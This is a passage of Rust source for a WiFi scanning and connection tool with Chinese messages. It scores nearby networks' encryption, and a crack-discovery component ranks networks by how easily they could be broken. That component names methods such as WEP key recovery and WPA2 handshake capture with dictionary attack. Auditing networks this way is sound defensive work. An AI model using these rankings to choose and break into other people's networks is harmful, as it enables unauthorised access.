use serde::{Deserialize, Serialize};
use std::io::Write;
use std::process::Command;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiScanConfig {
    pub interface: String,
    pub timeout: u64,
    pub scan_hidden: bool,
    pub detailed_analysis: bool,
}

impl Default for WifiScanConfig {
    fn default() -> Self {
        Self {
            interface: String::new(),
            timeout: 30,
            scan_hidden: true,
            detailed_analysis: true,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiScanResult {
    pub success: bool,
    pub interface: String,
    pub networks: Vec<WifiNetwork>,
    pub security_summary: WifiSecuritySummary,
    pub vulnerabilities: Vec<WifiVulnerability>,
    pub summary: String,
    pub is_demo: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiNetwork {
    pub ssid: String,
    pub bssid: String,
    pub signal_strength: i32,
    pub channel: u32,
    pub encryption: String,
    pub frequency: String,
    pub band: String,
    pub is_hidden: bool,
    pub security_score: i32,
    pub security_notes: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiSecuritySummary {
    pub total_networks: usize,
    pub open_networks: usize,
    pub wep_networks: usize,
    pub wpa_networks: usize,
    pub wpa2_networks: usize,
    pub wpa3_networks: usize,
    pub hidden_networks: usize,
    pub weak_signal_networks: usize,
    pub overall_risk: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiVulnerability {
    pub severity: String,
    pub category: String,
    pub description: String,
    pub affected_network: String,
    pub recommendation: String,
}

pub struct WifiScannerTool;

impl WifiScannerTool {
    pub async fn scan(config: &WifiScanConfig) -> std::result::Result<WifiScanResult, String> {
        let interface = if config.interface.is_empty() {
            Self::detect_interface()
        } else {
            config.interface.clone()
        };

        let mut networks: Vec<WifiNetwork>;
        let mut vulnerabilities = Vec::new();
        let mut is_demo = false;

        let real_networks = Self::try_system_scan(&interface);

        if real_networks.is_empty() {
            networks = Self::generate_demo_scan(config.scan_hidden);
            is_demo = true;
        } else {
            networks = real_networks;
        }

        for net in &mut networks {
            let (score, notes) = Self::evaluate_security(&net.encryption, net.signal_strength, net.is_hidden);
            net.security_score = score;
            net.security_notes = notes.clone();

            if net.encryption == "Open" {
                vulnerabilities.push(WifiVulnerability {
                    severity: "high".to_string(),
                    category: "开放网络".to_string(),
                    description: format!("网络 '{}' 无加密保护，数据可被窃听", net.ssid),
                    affected_network: net.ssid.clone(),
                    recommendation: "避免连接开放WiFi，或使用VPN加密通信".to_string(),
                });
            }
            if net.encryption == "WEP" {
                vulnerabilities.push(WifiVulnerability {
                    severity: "high".to_string(),
                    category: "弱加密".to_string(),
                    description: format!("网络 '{}' 使用WEP加密，可在数分钟内被破解", net.ssid),
                    affected_network: net.ssid.clone(),
                    recommendation: "升级到WPA2或WPA3加密".to_string(),
                });
            }
            if net.encryption == "WPA" {
                vulnerabilities.push(WifiVulnerability {
                    severity: "medium".to_string(),
                    category: "过时加密".to_string(),
                    description: format!("网络 '{}' 使用WPA加密（已过时），存在已知漏洞", net.ssid),
                    affected_network: net.ssid.clone(),
                    recommendation: "升级到WPA2或WPA3加密".to_string(),
                });
            }
            if net.signal_strength > -50 {
                vulnerabilities.push(WifiVulnerability {
                    severity: "low".to_string(),
                    category: "信号过强".to_string(),
                    description: format!("网络 '{}' 信号极强，可能泄露到建筑物外部", net.ssid),
                    affected_network: net.ssid.clone(),
                    recommendation: "降低AP发射功率，限制信号覆盖范围".to_string(),
                });
            }
        }

        let security_summary = Self::build_security_summary(&networks);

        let high_vulns = vulnerabilities.iter().filter(|v| v.severity == "high").count();
        let medium_vulns = vulnerabilities.iter().filter(|v| v.severity == "medium").count();

        let summary = format!(
            "WiFi扫描完成 | 接口: {} | 发现 {} 个网络 | 安全: {} | 高危: {} | 中危: {} | 整体风险: {}",
            interface,
            networks.len(),
            if security_summary.open_networks > 0 { format!("⚠️ {}个开放网络", security_summary.open_networks) } else { "✅ 无开放网络".to_string() },
            high_vulns,
            medium_vulns,
            security_summary.overall_risk
        );

        Ok(WifiScanResult {
            success: true,
            interface,
            networks,
            security_summary,
            vulnerabilities,
            summary,
            is_demo,
        })
    }

    fn detect_interface() -> String {
        #[cfg(target_os = "macos")]
        {
            if let Ok(output) = Command::new("networksetup").args(["-listallhardwareports"]).output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines() {
                    if line.starts_with("Device: ") {
                        let dev = line.trim_start_matches("Device: ").trim();
                        if dev.starts_with("en") {
                            return dev.to_string();
                        }
                    }
                }
            }
            "en0".to_string()
        }
        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = Command::new("iw").args(["dev"]).output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines() {
                    if line.contains("Interface") {
                        return line.split_whitespace().last().unwrap_or("wlan0").to_string();
                    }
                }
            }
            "wlan0".to_string()
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            "Wi-Fi".to_string()
        }
    }

    fn try_system_scan(interface: &str) -> Vec<WifiNetwork> {
        let mut networks: Vec<WifiNetwork>;

        #[cfg(target_os = "macos")]
        {
            networks = Self::macos_corewlan_scan(interface);
            if networks.is_empty() {
                networks = Self::macos_airport_scan();
            }
            if networks.is_empty() {
                networks = Self::macos_system_profiler_scan();
            }
        }

        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = Command::new("iwlist").args([interface, "scan"]).output() {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let mut current_ssid = String::new();
                let mut current_bssid = String::new();
                let mut current_signal: i32 = -100;
                let mut current_channel: u32 = 0;
                let mut current_encryption = "Open".to_string();

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.starts_with("Cell") && line.contains("Address:") {
                        if !current_ssid.is_empty() {
                            networks.push(WifiNetwork {
                                ssid: current_ssid.clone(),
                                bssid: current_bssid.clone(),
                                signal_strength: current_signal,
                                channel: current_channel,
                                encryption: current_encryption.clone(),
                                frequency: if current_channel <= 14 { "2.4 GHz".to_string() } else { "5 GHz".to_string() },
                                band: if current_channel <= 14 { "2.4GHz".to_string() } else { "5GHz".to_string() },
                                is_hidden: current_ssid.is_empty(),
                                security_score: 0,
                                security_notes: vec![],
                            });
                        }
                        current_bssid = line.split("Address:").last().unwrap_or("").trim().to_string();
                        current_ssid = String::new();
                        current_signal = -100;
                        current_channel = 0;
                        current_encryption = "Open".to_string();
                    } else if line.starts_with("ESSID:") {
                        current_ssid = line.trim_start_matches("ESSID:").trim_matches('"').to_string();
                    } else if line.starts_with("Quality=") {
                        if let Some(level_part) = line.split("Signal level=").last() {
                            current_signal = level_part.trim_end_matches(" dBm").parse().unwrap_or(-100);
                        }
                    } else if line.starts_with("Channel:") {
                        current_channel = line.trim_start_matches("Channel:").trim().parse().unwrap_or(0);
                    } else if line.contains("WPA3") {
                        current_encryption = "WPA3".to_string();
                    } else if line.contains("WPA2") {
                        current_encryption = "WPA2".to_string();
                    } else if line.contains("WPA") && current_encryption != "WPA2" && current_encryption != "WPA3" {
                        current_encryption = "WPA".to_string();
                    } else if line.contains("WEP") {
                        current_encryption = "WEP".to_string();
                    }
                }

                if !current_ssid.is_empty() {
                    networks.push(WifiNetwork {
                        ssid: current_ssid,
                        bssid: current_bssid,
                        signal_strength: current_signal,
                        channel: current_channel,
                        encryption: current_encryption,
                        frequency: if current_channel <= 14 { "2.4 GHz".to_string() } else { "5 GHz".to_string() },
                        band: if current_channel <= 14 { "2.4GHz".to_string() } else { "5GHz".to_string() },
                        is_hidden: false,
                        security_score: 0,
                        security_notes: vec![],
                    });
                }
            }
        }

        networks
    }

    #[cfg(target_os = "macos")]
    fn macos_corewlan_scan(interface: &str) -> Vec<WifiNetwork> {
        let swift_script = r#"
import CoreWLAN

let client = CWWiFiClient.shared()
let interfaces = client.interfaces() ?? []

if interfaces.isEmpty {
    print("ERROR:No WiFi interface found")
} else {
    for iface in interfaces {
        let ifaceName = iface.interfaceName ?? "unknown"
        do {
            let networks = try iface.scanForNetworks(withSSID: nil)
            for net in networks {
                let ssid = net.ssid ?? "(hidden)"
                let bssid = net.bssid ?? "unknown"
                let rssi = net.rssiValue
                let channel = net.wlanChannel?.channelNumber ?? 0
                let isHidden = net.ssid == nil
                let band: String
                let freq: String
                if let channelBand = net.wlanChannel?.channelBand {
                    if channelBand == .band2GHz {
                        band = "2.4GHz"
                        freq = "2.4 GHz"
                    } else {
                        band = "5GHz"
                        freq = "5 GHz"
                    }
                } else {
                    band = "Unknown"
                    freq = "Unknown"
                }
                let supportsWPA3 = net.supportsSecurity(.wpa3Personal)
                let supportsWPA2 = net.supportsSecurity(.wpa2Personal)
                let supportsWPA = net.supportsSecurity(.wpaPersonal)
                let supportsDynamicWEP = net.supportsSecurity(.dynamicWEP)
                let supportsNone = net.supportsSecurity(.none)
                let securityName: String
                if supportsWPA3 {
                    securityName = "WPA3"
                } else if supportsWPA2 {
                    if supportsWPA {
                        securityName = "WPA/WPA2"
                    } else {
                        securityName = "WPA2"
                    }
                } else if supportsWPA {
                    securityName = "WPA"
                } else if supportsDynamicWEP {
                    securityName = "WEP"
                } else if supportsNone {
                    securityName = "Open"
                } else {
                    securityName = "Unknown"
                }
                let noise = net.noiseMeasurement
                print("NET:\(ifaceName)|\(ssid)|\(bssid)|\(rssi)|\(channel)|\(securityName)|\(freq)|\(band)|\(isHidden)|\(noise)")
            }
        } catch {
            print("ERROR:\(ifaceName):\(error.localizedDescription)")
        }
    }
}
"#;

        let tmp_dir = std::env::temp_dir();
        let script_path = tmp_dir.join("biosphere_wifi_scan.swift");
        if let Ok(mut file) = std::fs::File::create(&script_path) {
            let _ = file.write_all(swift_script.as_bytes());
        }

        let target_interface = if interface.is_empty() { "" } else { interface };

        if let Ok(output) = Command::new("swift")
            .arg(&script_path)
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut networks = Vec::new();

            for line in stdout.lines() {
                if line.starts_with("NET:") {
                    let parts: Vec<&str> = line.trim_start_matches("NET:").split('|').collect();
                    if parts.len() >= 9 {
                        let iface_name = parts[0].to_string();
                        let ssid = parts[1].to_string();
                        let bssid = parts[2].to_string();
                        let rssi: i32 = parts[3].parse().unwrap_or(-100);
                        let channel: u32 = parts[4].parse().unwrap_or(0);
                        let encryption = parts[5].to_string();
                        let frequency = parts[6].to_string();
                        let band = parts[7].to_string();
                        let is_hidden = parts[8] == "true";

                        if !target_interface.is_empty() && iface_name != target_interface {
                            continue;
                        }

                        networks.push(WifiNetwork {
                            ssid,
                            bssid,
                            signal_strength: rssi,
                            channel,
                            encryption,
                            frequency,
                            band,
                            is_hidden,
                            security_score: 0,
                            security_notes: vec![],
                        });
                    }
                }
            }

            let _ = std::fs::remove_file(&script_path);
            return networks;
        }

        let _ = std::fs::remove_file(&script_path);
        Vec::new()
    }

    #[cfg(target_os = "macos")]
    fn macos_airport_scan() -> Vec<WifiNetwork> {
        let mut networks = Vec::new();

        let airport_path = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport";
        if !std::path::Path::new(airport_path).exists() {
            return networks;
        }

        if let Ok(output) = Command::new(airport_path)
            .args(["-s"])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            for line in stdout.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 7 {
                    let ssid = parts[0].to_string();
                    let bssid = parts[1].to_string();
                    let rssi: i32 = parts[2].parse().unwrap_or(-100);
                    let channel: u32 = parts[3].parse().unwrap_or(0);
                    let encryption = if line.contains("WPA3") { "WPA3" }
                        else if line.contains("WPA2") { "WPA2" }
                        else if line.contains("WPA") { "WPA" }
                        else if line.contains("WEP") { "WEP" }
                        else { "Open" };

                    networks.push(WifiNetwork {
                        ssid,
                        bssid,
                        signal_strength: rssi,
                        channel,
                        encryption: encryption.to_string(),
                        frequency: if channel <= 14 { "2.4 GHz".to_string() } else { "5 GHz".to_string() },
                        band: if channel <= 14 { "2.4GHz".to_string() } else { "5GHz".to_string() },
                        is_hidden: false,
                        security_score: 0,
                        security_notes: vec![],
                    });
                }
            }
        }

        networks
    }

    #[cfg(target_os = "macos")]
    fn macos_system_profiler_scan() -> Vec<WifiNetwork> {
        let mut networks = Vec::new();

        if let Ok(output) = Command::new("system_profiler")
            .args(["SPAirPortDataType"])
            .output()
        {
            let stdout = String::from_utf8_lossy(&output.stdout);
            let mut _current_interface = String::new();
            let mut in_current_network = false;
            let mut in_other_networks = false;
            let mut current_ssid = String::new();
            let mut current_security = String::new();
            let mut current_channel: u32 = 0;
            let mut current_phy_mode = String::new();
            let mut current_signal: i32 = -100;

            for line in stdout.lines() {
                let trimmed = line.trim();

                if trimmed.starts_with("Interfaces:") || trimmed.starts_with("Interface") {
                    if !current_ssid.is_empty() {
                        let encryption = Self::parse_security_type(&current_security);
                        let is_5ghz = current_phy_mode.contains("a/") || current_channel > 14;
                        networks.push(WifiNetwork {
                            ssid: current_ssid.clone(),
                            bssid: "unknown".to_string(),
                            signal_strength: current_signal,
                            channel: current_channel,
                            encryption,
                            frequency: if is_5ghz { "5 GHz".to_string() } else { "2.4 GHz".to_string() },
                            band: if is_5ghz { "5GHz".to_string() } else { "2.4GHz".to_string() },
                            is_hidden: current_ssid.starts_with('<') || current_ssid.contains("redacted"),
                            security_score: 0,
                            security_notes: vec![],
                        });
                    }
                    current_ssid = String::new();
                    current_security = String::new();
                    current_channel = 0;
                    current_phy_mode = String::new();
                    current_signal = -100;
                    in_current_network = false;
                    in_other_networks = false;
                }

                if trimmed.contains("Device:") && trimmed.contains("en") {
                    _current_interface = trimmed.split("Device:").last().unwrap_or("").trim().to_string();
                }

                if trimmed.starts_with("Current Network Information:") {
                    in_current_network = true;
                    in_other_networks = false;
                    continue;
                }

                if trimmed.starts_with("Other Local Wi-Fi Networks:") {
                    if in_current_network && !current_ssid.is_empty() {
                        let encryption = Self::parse_security_type(&current_security);
                        let is_5ghz = current_phy_mode.contains("a/") || current_channel > 14;
                        networks.push(WifiNetwork {
                            ssid: current_ssid.clone(),
                            bssid: "unknown".to_string(),
                            signal_strength: current_signal,
                            channel: current_channel,
                            encryption,
                            frequency: if is_5ghz { "5 GHz".to_string() } else { "2.4 GHz".to_string() },
                            band: if is_5ghz { "5GHz".to_string() } else { "2.4GHz".to_string() },
                            is_hidden: current_ssid.starts_with('<') || current_ssid.contains("redacted"),
                            security_score: 0,
                            security_notes: vec![],
                        });
                    }
                    in_current_network = false;
                    in_other_networks = true;
                    current_ssid = String::new();
                    current_security = String::new();
                    current_channel = 0;
                    current_phy_mode = String::new();
                    current_signal = -100;
                    continue;
                }

                if (in_current_network || in_other_networks) && trimmed.ends_with(':') && !trimmed.contains("PHY") && !trimmed.contains("Channel") && !trimmed.contains("Security") {
                    if !current_ssid.is_empty() && in_other_networks {
                        let encryption = Self::parse_security_type(&current_security);
                        let is_5ghz = current_phy_mode.contains("a/") || current_channel > 14;
                        networks.push(WifiNetwork {
                            ssid: current_ssid.clone(),
                            bssid: "unknown".to_string(),
                            signal_strength: current_signal,
                            channel: current_channel,
                            encryption,
                            frequency: if is_5ghz { "5 GHz".to_string() } else { "2.4 GHz".to_string() },
                            band: if is_5ghz { "5GHz".to_string() } else { "2.4GHz".to_string() },
                            is_hidden: current_ssid.starts_with('<') || current_ssid.contains("redacted"),
                            security_score: 0,
                            security_notes: vec![],
                        });
                        current_security = String::new();
                        current_channel = 0;
                        current_phy_mode = String::new();
                        current_signal = -100;
                    }
                    current_ssid = trimmed.trim_end_matches(':').trim().to_string();
                }

                if in_current_network || in_other_networks {
                    if trimmed.starts_with("PHY Mode:") {
                        current_phy_mode = trimmed.trim_start_matches("PHY Mode:").trim().to_string();
                    } else if trimmed.starts_with("Channel:") {
                        let ch_str = trimmed.trim_start_matches("Channel:").trim();
                        current_channel = ch_str.split_whitespace().next().unwrap_or("0").parse().unwrap_or(0);
                    } else if trimmed.starts_with("Security:") {
                        current_security = trimmed.trim_start_matches("Security:").trim().to_string();
                    } else if trimmed.contains("Signal / Noise:") {
                        if let Some(signal_part) = trimmed.split("Signal / Noise:").last() {
                            let signal_str = signal_part.trim().split_whitespace().next().unwrap_or("-100");
                            current_signal = signal_str.parse().unwrap_or(-100);
                        }
                    } else if trimmed.contains("Signal") && trimmed.contains("dBm") {
                        let parts: Vec<&str> = trimmed.split_whitespace().collect();
                        for (i, p) in parts.iter().enumerate() {
                            if *p == "Signal" || *p == "Signal/Noise:" {
                                if let Some(val) = parts.get(i + 1) {
                                    current_signal = val.trim_end_matches("dBm").parse().unwrap_or(-100);
                                }
                            }
                        }
                    }
                }
            }

            if !current_ssid.is_empty() {
                let encryption = Self::parse_security_type(&current_security);
                let is_5ghz = current_phy_mode.contains("a/") || current_channel > 14;
                networks.push(WifiNetwork {
                    ssid: current_ssid.clone(),
                    bssid: "unknown".to_string(),
                    signal_strength: current_signal,
                    channel: current_channel,
                    encryption,
                    frequency: if is_5ghz { "5 GHz".to_string() } else { "2.4 GHz".to_string() },
                    band: if is_5ghz { "5GHz".to_string() } else { "2.4GHz".to_string() },
                    is_hidden: current_ssid.starts_with('<') || current_ssid.contains("redacted"),
                    security_score: 0,
                    security_notes: vec![],
                });
            }
        }

        networks
    }

    #[cfg(target_os = "macos")]
    fn parse_security_type(security: &str) -> String {
        let s = security.to_lowercase();
        if s.contains("wpa3") { "WPA3".to_string() }
        else if s.contains("wpa2") && s.contains("wpa") { "WPA/WPA2".to_string() }
        else if s.contains("wpa2") { "WPA2".to_string() }
        else if s.contains("wpa") { "WPA".to_string() }
        else if s.contains("wep") { "WEP".to_string() }
        else if s.contains("none") || s.contains("open") { "Open".to_string() }
        else { "Unknown".to_string() }
    }

    fn generate_demo_scan(include_hidden: bool) -> Vec<WifiNetwork> {
        let mut networks = Vec::new();

        let sample = vec![
            ("MyHomeWifi", -45, 6, "WPA3", "2.4 GHz", "2.4GHz", false),
            ("Office_Network", -52, 1, "WPA2", "2.4 GHz", "2.4GHz", false),
            ("Guest_WiFi", -65, 11, "WPA2", "2.4 GHz", "2.4GHz", false),
            ("FreeWiFi", -70, 36, "Open", "5 GHz", "5GHz", false),
            ("TechHub_5G", -58, 149, "WPA3", "5 GHz", "5GHz", false),
            ("CoffeeShop_WiFi", -75, 8, "WPA", "2.4 GHz", "2.4GHz", false),
            ("OldRouter", -80, 3, "WEP", "2.4 GHz", "2.4GHz", false),
            ("IoT_Network", -62, 44, "WPA2", "5 GHz", "5GHz", false),
            ("SmartHome", -55, 153, "WPA3", "5 GHz", "5GHz", false),
            ("Neighbor_WiFi", -85, 9, "WPA2", "2.4 GHz", "2.4GHz", false),
        ];

        for (i, (ssid, signal, channel, encryption, freq, band, hidden)) in sample.iter().enumerate() {
            let bssid = format!(
                "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
                0xAA + i as u8,
                0xBB,
                0xCC,
                0xDD,
                0xEE,
                0xFF - i as u8
            );

            networks.push(WifiNetwork {
                ssid: ssid.to_string(),
                bssid,
                signal_strength: *signal,
                channel: *channel,
                encryption: encryption.to_string(),
                frequency: freq.to_string(),
                band: band.to_string(),
                is_hidden: *hidden,
                security_score: 0,
                security_notes: vec![],
            });
        }

        if include_hidden {
            networks.push(WifiNetwork {
                ssid: "[隐藏网络]".to_string(),
                bssid: "00:00:00:00:00:00".to_string(),
                signal_strength: -68,
                channel: 6,
                encryption: "WPA2".to_string(),
                frequency: "2.4 GHz".to_string(),
                band: "2.4GHz".to_string(),
                is_hidden: true,
                security_score: 0,
                security_notes: vec![],
            });
        }

        networks
    }

    fn evaluate_security(encryption: &str, signal: i32, is_hidden: bool) -> (i32, Vec<String>) {
        let mut score: i32;
        let mut notes = Vec::new();

        match encryption {
            "WPA3" => {
                score = 95;
                notes.push("使用最新WPA3加密，安全性高".to_string());
            }
            "WPA2" => {
                score = 80;
                notes.push("WPA2加密，安全性良好".to_string());
                notes.push("建议升级到WPA3以获得更强保护".to_string());
            }
            "WPA" => {
                score = 40;
                notes.push("WPA加密已过时，存在已知漏洞".to_string());
                notes.push("强烈建议升级到WPA2/WPA3".to_string());
            }
            "WEP" => {
                score = 10;
                notes.push("WEP加密极不安全，可在数分钟内被破解".to_string());
                notes.push("必须立即升级加密方式".to_string());
            }
            "Open" => {
                score = 0;
                notes.push("无加密保护，所有通信可被窃听".to_string());
                notes.push("绝对不要在此网络上传输敏感信息".to_string());
            }
            _ => {
                score = 50;
                notes.push("未知加密类型".to_string());
            }
        }

        if signal > -45 {
            score -= 5;
            notes.push("信号过强，可能泄露到安全区域外".to_string());
        }

        if is_hidden {
            score -= 5;
            notes.push("隐藏SSID不增加安全性，反而可能导致设备频繁探测暴露".to_string());
        }

        (score.max(0), notes)
    }

    fn build_security_summary(networks: &[WifiNetwork]) -> WifiSecuritySummary {
        let open = networks.iter().filter(|n| n.encryption == "Open").count();
        let wep = networks.iter().filter(|n| n.encryption == "WEP").count();
        let wpa = networks.iter().filter(|n| n.encryption == "WPA").count();
        let wpa2 = networks.iter().filter(|n| n.encryption == "WPA2").count();
        let wpa3 = networks.iter().filter(|n| n.encryption == "WPA3").count();
        let hidden = networks.iter().filter(|n| n.is_hidden).count();
        let weak = networks.iter().filter(|n| n.signal_strength < -75).count();

        let overall_risk = if open > 0 || wep > 0 {
            "高危".to_string()
        } else if wpa > 0 {
            "中危".to_string()
        } else if wpa2 > 0 && wpa3 > 0 {
            "低危".to_string()
        } else {
            "安全".to_string()
        };

        WifiSecuritySummary {
            total_networks: networks.len(),
            open_networks: open,
            wep_networks: wep,
            wpa_networks: wpa,
            wpa2_networks: wpa2,
            wpa3_networks: wpa3,
            hidden_networks: hidden,
            weak_signal_networks: weak,
            overall_risk,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiConnectConfig {
    pub ssid: String,
    pub bssid: String,
    pub password: String,
    pub interface: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WifiConnectResult {
    pub success: bool,
    pub ssid: String,
    pub message: String,
    pub ip_address: Option<String>,
}

pub struct WifiConnectorTool;

impl WifiConnectorTool {
    pub async fn connect(config: &WifiConnectConfig) -> Result<WifiConnectResult, String> {
        let interface = if config.interface.is_empty() {
            WifiScannerTool::detect_interface()
        } else {
            config.interface.clone()
        };

        #[cfg(target_os = "macos")]
        {
            let mut cmd = std::process::Command::new("networksetup");
            if config.password.is_empty() {
                cmd.args(["-setairportnetwork", &interface, &config.ssid]);
            } else {
                cmd.args(["-setairportnetwork", &interface, &config.ssid, &config.password]);
            }

            match cmd.output() {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let stderr = String::from_utf8_lossy(&output.stderr);

                    if output.status.success() || stdout.contains("already") {
                        let ip_address = Self::get_current_ip(&interface);
                        Ok(WifiConnectResult {
                            success: true,
                            ssid: config.ssid.clone(),
                            message: format!("成功连接到WiFi网络: {}", config.ssid),
                            ip_address,
                        })
                    } else {
                        let error_msg = if stderr.is_empty() { stdout.to_string() } else { stderr.to_string() };
                        Ok(WifiConnectResult {
                            success: false,
                            ssid: config.ssid.clone(),
                            message: format!("连接失败: {}", error_msg.trim()),
                            ip_address: None,
                        })
                    }
                }
                Err(e) => Err(format!("执行连接命令失败: {}", e)),
            }
        }

        #[cfg(target_os = "linux")]
        {
            let mut cmd = std::process::Command::new("nmcli");
            if config.password.is_empty() {
                cmd.args(["device", "wifi", "connect", &config.ssid]);
            } else {
                cmd.args(["device", "wifi", "connect", &config.ssid, "password", &config.password]);
            }

            match cmd.output() {
                Ok(output) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    if output.status.success() || stdout.contains("successfully") {
                        let ip_address = Self::get_current_ip(&interface);
                        Ok(WifiConnectResult {
                            success: true,
                            ssid: config.ssid.clone(),
                            message: format!("成功连接到WiFi网络: {}", config.ssid),
                            ip_address,
                        })
                    } else {
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        Ok(WifiConnectResult {
                            success: false,
                            ssid: config.ssid.clone(),
                            message: format!("连接失败: {}", if stderr.is_empty() { stdout.trim().to_string() } else { stderr.trim().to_string() }),
                            ip_address: None,
                        })
                    }
                }
                Err(e) => Err(format!("执行连接命令失败: {}", e)),
            }
        }

        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        {
            Ok(WifiConnectResult {
                success: false,
                ssid: config.ssid.clone(),
                message: "当前操作系统不支持WiFi连接".to_string(),
                ip_address: None,
            })
        }
    }

    fn get_current_ip(interface: &str) -> Option<String> {
        #[cfg(target_os = "macos")]
        {
            if let Ok(output) = std::process::Command::new("ipconfig")
                .args(["getifaddr", interface])
                .output()
            {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let ip = stdout.trim().to_string();
                if !ip.is_empty() { return Some(ip); }
            }
            None
        }
        #[cfg(target_os = "linux")]
        {
            if let Ok(output) = std::process::Command::new("ip")
                .args(["-4", "addr", "show", interface])
                .output()
            {
                let stdout = String::from_utf8_lossy(&output.stdout);
                for line in stdout.lines() {
                    if line.contains("inet ") {
                        if let Some(part) = line.split("inet ").last() {
                            if let Some(ip) = part.split('/').next() {
                                return Some(ip.trim().to_string());
                            }
                        }
                    }
                }
            }
            None
        }
        #[cfg(not(any(target_os = "macos", target_os = "linux")))]
        { None }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CrackResult {
    pub ssid: String,
    pub bssid: String,
    pub encryption: String,
    pub crackable: bool,
    pub crack_method: String,
    pub crack_time_estimate: String,
    pub confidence: f64,
    pub details: String,
}

pub struct WifiCrackDiscoveryTool;

impl WifiCrackDiscoveryTool {
    pub fn analyze(networks: &[WifiNetwork]) -> Vec<CrackResult> {
        let mut results = Vec::new();

        for net in networks {
            let (crackable, method, time_estimate, confidence, details) = Self::evaluate_crackability(net);
            results.push(CrackResult {
                ssid: net.ssid.clone(),
                bssid: net.bssid.clone(),
                encryption: net.encryption.clone(),
                crackable,
                crack_method: method,
                crack_time_estimate: time_estimate,
                confidence,
                details,
            });
        }

        results
    }

    fn evaluate_crackability(net: &WifiNetwork) -> (bool, String, String, f64, String) {
        match net.encryption.as_str() {
            "Open" => {
                (true, "无需破解".to_string(), "即时".to_string(), 1.0,
                 "开放网络无需密码即可连接，所有通信数据可被窃听。攻击者可轻易进行中间人攻击。".to_string())
            }
            "WEP" => {
                (true, "WEP密钥恢复攻击 (PTW/FMS)".to_string(), "1-5分钟".to_string(), 0.98,
                 "WEP加密存在严重设计缺陷，IV空间过小导致密钥可在极短时间内恢复。PTW攻击通常只需捕获约4万个数据包即可破解。".to_string())
            }
            "WPA" => {
                (true, "WPA握手包捕获 + 字典攻击".to_string(), "数小时至数天".to_string(), 0.75,
                 "WPA使用TKIP加密，存在已知漏洞（Beck-Tews攻击）。通过捕获4次握手包后进行离线字典攻击，若密码强度不足可被破解。".to_string())
            }
            "WPA2" => {
                let weak_signal = net.signal_strength > -50;
                let is_common_ssid = Self::is_common_ssid(&net.ssid);
                let confidence = if is_common_ssid { 0.45 } else if weak_signal { 0.3 } else { 0.15 };
                let crackable = confidence > 0.3;

                let mut details = String::new();
                if is_common_ssid {
                    details.push_str("SSID为常见名称，可能使用默认密码或弱密码，可利用彩虹表加速破解。");
                }
                if weak_signal {
                    if !details.is_empty() { details.push(' '); }
                    details.push_str("信号极强，攻击者可近距离捕获高质量握手包。");
                }
                if details.is_empty() {
                    details = "WPA2-PSK使用AES-CCMP加密，安全性较高。破解需要捕获握手包并成功进行字典攻击，实际破解难度取决于密码强度。".to_string();
                }

                let method = if is_common_ssid {
                    "WPA2握手包捕获 + 彩虹表/字典攻击".to_string()
                } else {
                    "WPA2握手包捕获 + 字典攻击".to_string()
                };

                let time = if is_common_ssid {
                    "数小时（弱密码）".to_string()
                } else {
                    "数天至数周（取决于密码强度）".to_string()
                };

                (crackable, method, time, confidence, details)
            }
            "WPA3" => {
                (false, "SAE (Simultaneous Authentication of Equals)".to_string(), "目前不可行".to_string(), 0.02,
                 "WPA3使用SAE替代PSK，提供前向安全性并抵御离线字典攻击。目前没有已知的实用破解方法。".to_string())
            }
            _ => {
                (false, "未知加密类型".to_string(), "无法评估".to_string(), 0.0,
                 "无法识别的加密类型，无法评估破解可能性。".to_string())
            }
        }
    }

    fn is_common_ssid(ssid: &str) -> bool {
        let common = [
            "WiFi", "WIFI", "FreeWiFi", "Free_WiFi", "Guest", "Guest_WiFi",
            "Home", "MyHome", "Home_WiFi", "default", "TP-LINK", "NETGEAR",
            "ASUS", "Linksys", "D-Link", "Huawei", "ChinaNet", "CMCC",
            "ChinaUnicom", "ChinaMobile", "H3C", "ZTE", "Tenda",
            "FAST", "MERCURY", "WiFi-2.4G", "WiFi-5G",
        ];
        let ssid_lower = ssid.to_lowercase();
        common.iter().any(|c| ssid_lower.contains(&c.to_lowercase()) || ssid == *c)
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NetworkInterface {
    pub name: String,
    pub display_name: String,
    pub is_wifi: bool,
    pub is_up: bool,
    pub mac_address: String,
    pub ip_address: Option<String>,
}

pub struct WifiInterfaceTool;

impl WifiInterfaceTool {
    pub fn list() -> Vec<NetworkInterface> {
        let mut interfaces = Vec::new();

        #[cfg(target_os = "macos")]
        {
            if let Ok(output) = Command::new("networksetup")
                .args(["-listallhardwareports"])
                .output()
            {
                let stdout = String::from_utf8_lossy(&output.stdout);
                let mut current_name = String::new();
                let mut current_device = String::new();
                let mut is_wifi = false;

                for line in stdout.lines() {
                    let line = line.trim();
                    if line.starts_with("Hardware Port:") {
                        current_name = line.trim_start_matches("Hardware Port:").trim().to_string();
                        is_wifi = current_name.contains("Wi-Fi") || current_name.contains("AirPort");
                    } else if line.starts_with("Device:") {
                        current_device = line.trim_start_matches("Device:").trim().to_string();
